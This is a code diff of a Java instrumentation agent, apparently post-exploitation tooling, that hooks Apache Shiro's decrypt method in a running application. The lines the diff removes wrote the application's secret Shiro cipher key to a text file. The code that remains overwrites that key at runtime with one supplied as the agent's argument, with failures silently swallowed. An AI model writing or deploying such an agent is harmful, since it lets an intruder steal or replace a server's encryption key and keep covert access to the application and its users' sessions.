@@ -34,21 +34,10 @@ public class TestAgent {
                         CtClass ctClass = classPool.get(clazz.getName());
                         CtMethod ctMethod = ctClass.getMethod("decrypt", "([B)[B");
                         ctMethod.insertBefore(String.format("java.lang.String temp = \"%s\";\n" +
-                                "if(temp.endsWith(\"\\.txt\")){" +
-                                "try {\n" +
-                                "   " +
-                                "   java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(new java.io.File(temp),true);\n" +
-                                "   fileOutputStream.write(\"Shiro key: \".getBytes());\n" +
-                                "   fileOutputStream.write(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()).getBytes());\n" +
-                                "   fileOutputStream.write(\"\\n\".getBytes());\n" +
-                                "   fileOutputStream.flush();\n" +
-                                "   fileOutputStream.close();\n}" +
-                                "catch(java.lang.Throwable e){\n" +
-                                "}\n}else{\n" +
                                 "try{\n" +
                                 "setCipherKey(org.apache.shiro.codec.Base64.decode(temp));\n" +
                                 "}catch(java.lang.Throwable e){\n" +
-                                "\n}\n}\n",agentArgs));
+                                "\n}\n",agentArgs));
                         inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                         ctClass.detach();
                     } catch (UnmodifiableClassException | CannotCompileException e) {
